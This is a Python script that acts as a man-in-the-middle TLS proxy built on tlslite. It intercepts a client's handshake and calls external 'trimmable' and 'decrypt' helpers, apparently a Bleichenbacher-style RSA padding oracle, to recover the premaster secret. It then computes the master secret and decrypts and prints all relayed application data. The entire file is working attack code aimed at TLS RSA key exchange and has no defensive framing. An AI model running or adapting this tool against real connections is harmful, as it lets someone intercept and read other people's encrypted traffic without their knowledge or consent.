#!/usr/bin/env python3

import socket
from tlslite.api import *
from tlslite.constants import ContentType, HandshakeType
from binascii import hexlify, unhexlify
from tlslite.mathtls import calcMasterSecret
from tlslite.messages import ApplicationData
import subprocess
import sys

def handshakeProxy(c_conn, s_conn, oracle):
    s_conn._handshakeStart(client=False)
    c_conn._handshakeStart(client=True)

    s_settings = HandshakeSettings()
    c_settings = HandshakeSettings()


    # CLIENT HELLO          C -> S
    for result in s_conn._getMsg(ContentType.handshake,
                           HandshakeType.client_hello):
        if result in (0,1): yield result
        else: break
    clientHello = result

    c_conn.version = (3, 1) # Hardcoded version

    for result in c_conn._sendMsg(clientHello):
        yield result


    # Send Server Hello, Certificate and Server Hello Done in one packet
    s_conn.sock.buffer_writes = True

    # SERVER HELLO           S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.server_hello):
        if result in (0,1): yield result
        else: break
    serverHello = result

    s_conn.version = serverHello.server_version
    cipherSuite = serverHello.cipher_suite

    for result in s_conn._sendMsg(serverHello):
        yield result


    # CERTIFICATE           S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.certificate,
                           serverHello.certificate_type): # FIXME : we should only allow RSA
        if result in (0,1): yield result
        else: break
    serverCertificate = result

    for result in s_conn._sendMsg(serverCertificate):
        yield result


    # CERTIFICATE REQUEST   S -> C
    if 0:
        for result in c_conn._getMsg(ContentType.handshake,
                               HandshakeType.certificate_request):
            if result in (0,1): yield result
            else: break
        certificate_request = result

        for result in s_conn._sendMsg(certificate_request):
            yield result


    # SERVER HELLO DONE     S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.server_hello_done):
        if result in (0,1): yield result
        else: break
    serverHelloDone = result

    for result in s_conn._sendMsg(serverHelloDone):
        yield result


    s_conn.sock.flush()
    s_conn.sock.buffer_writes = False


    # Send Client Key Exchange, Change Cipher Spec, Finished in one message
    c_conn.sock.buffer_writes = True

    # CERTIFICATE           C -> S
    if 0:
        for result in s_conn._getMsg(ContentType.handshake,
                               HandshakeType.certificate,
                               serverHello.certificate_type): # FIXME : we should allow anything ?
            if result in (0,1): yield result
            else: break
        clientCertificate = result

        for result in c_conn._sendMsg(clientCertificate):
            yield result


    # CLIENT KEY EXCHANGE   C -> S
    for result in s_conn._getMsg(ContentType.handshake,
                           HandshakeType.client_key_exchange,
                           cipherSuite):
        if result in (0,1): yield result
        else: break
    clientKeyExchange = result

    # Ask the oracle if we continue
    epms = clientKeyExchange.encryptedPreMasterSecret
    if not oracle(epms):
        # YOU SHALL NOT PASS !
        print("Shall not pass")
        return

    print("Decoding phase")

    # Decrypt master key
    dec = subprocess.Popen(['./decrypt', '{}:{}'.format(*oracleaddr), cert], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    dec.stdin.write(hexlify(epms) + b'\n')
    dec.stdin.close()
    res = dec.stdout.readline().strip().split()[-1]
    dec.stdout.close()
    print(res)
    premasterSecret = unhexlify(res)


    # If it's ok, continue
    for result in c_conn._sendMsg(clientKeyExchange):
        yield result


    settings = HandshakeSettings()


    masterSecret = calcMasterSecret(c_conn.version,
                                    cipherSuite,
                                    premasterSecret,
                                    clientHello.random,
                                    serverHello.random)

    print(masterSecret)

    s_conn._calcPendingStates(cipherSuite, masterSecret, 
                              clientHello.random, serverHello.random, 
                              settings.cipherImplementations)
    c_conn._calcPendingStates(cipherSuite, masterSecret, 
                              clientHello.random, serverHello.random, 
                              settings.cipherImplementations)

    print('foobar')

    # CHANGE-CIPHER-SPEC   C -> S
    for result in s_conn._getMsg(ContentType.change_cipher_spec):
        if result in (0,1):
            yield result
    s_changeCipherSpec = result
    for result in c_conn._sendMsg(s_changeCipherSpec):
        yield result

    s_conn._changeReadState()
    c_conn._changeWriteState()

    # SERVER-FINISHED   C -> S
    for result in s_conn._getMsg(ContentType.handshake, HandshakeType.finished):
        if result in (0,1):
            yield result
    server_finished = result
    for result in c_conn._sendMsg(server_finished):
        yield result

    c_conn.sock.flush()
    c_conn.sock.buffer_writes = False



    # Send New Session Ticket, Change Cipher Spec, Finished in one message
    s_conn.sock.buffer_writes = True

    # NEW-SESSION-TICKET
    for result in c_conn._getMsg(ContentType.handshake, HandshakeType.new_session_ticket):
        if result in (0,1):
            yield result
    newSessionTicket = result
    for result in s_conn._sendMsg(newSessionTicket):
        yield result


    # CHANGE-CIPHER-SPEC
    for result in c_conn._getMsg(ContentType.change_cipher_spec):
        if result in (0,1):
            yield result
    c_changeCipherSpec = result
    for result in s_conn._sendMsg(c_changeCipherSpec):
        yield result

    c_conn._changeReadState()
    s_conn._changeWriteState()


    # SERVER-FINISHED
    for result in c_conn._getMsg(ContentType.handshake, HandshakeType.finished):
        if result in (0,1):
            yield result
    client_finished = result
    for result in s_conn._sendMsg(client_finished):
        yield result

    s_conn.sock.flush()
    s_conn.sock.buffer_writes = False

    c_conn._handshakeDone(False)
    s_conn._handshakeDone(False)


    cont = True
    while cont:
        for c_data, s_data in zip(c_conn.readAsync(), s_conn.readAsync()):
            if c_data in (0, 1):
                yield c_data
            elif not c_data:
                # End connection
                print('server ended')
                cont = False
            else:
                print('c', c_data)
                for result in s_conn.writeAsync(c_data):
                    yield result
            if s_data in (0, 1):
                yield s_data
            elif not s_data:
                # End connection
                print('client ended')
                cont = False
            else:
                print('s', s_data)
                for result in c_conn.writeAsync(s_data):
                    yield result

    c_conn.close()
    s_conn.close()

    print("The end")


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: {} listenaddr connectaddr oracleaddr cert".format(sys.argv[0]))
        exit(0)

    # Get parameters
    listenaddr, connectaddr, oracleaddr, cert = sys.argv[1:]
    listenaddr = (listenaddr.rsplit(':', 1)[0], int(listenaddr.rsplit(':', 1)[1]))
    connectaddr = (connectaddr.rsplit(':', 1)[0], int(connectaddr.rsplit(':', 1)[1]))
    oracleaddr = (oracleaddr.rsplit(':', 1)[0], int(oracleaddr.rsplit(':', 1)[1]))

    oracle = lambda epms: not subprocess.call(["./trimmable", '{}:{}'.format(*oracleaddr), cert, hexlify(epms)])

    # Setup server socket
    bindsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bindsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsock.bind(listenaddr)
    print("Listening on {}:{}".format(*listenaddr), file=sys.stderr)
    bindsock.listen(1)

    while True:
        # Wait for client
        s_sock, fromaddr = bindsock.accept()
        print("Connection from {}:{}".format(*fromaddr), file=sys.stderr)

        # Open connection to the TLS server
        c_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c_sock.connect(connectaddr)
        print("Proxying to {}:{}".format(*connectaddr), file=sys.stderr)

        c_sock.setblocking(False)
        s_sock.setblocking(False)

        c_conn = TLSConnection(c_sock)
        s_conn = TLSConnection(s_sock)

        # Proxy the connection
        for res in handshakeProxy(c_conn, s_conn, oracle):
            pass

        c_sock.close()
        s_sock.close()
        print(file=sys.stderr)


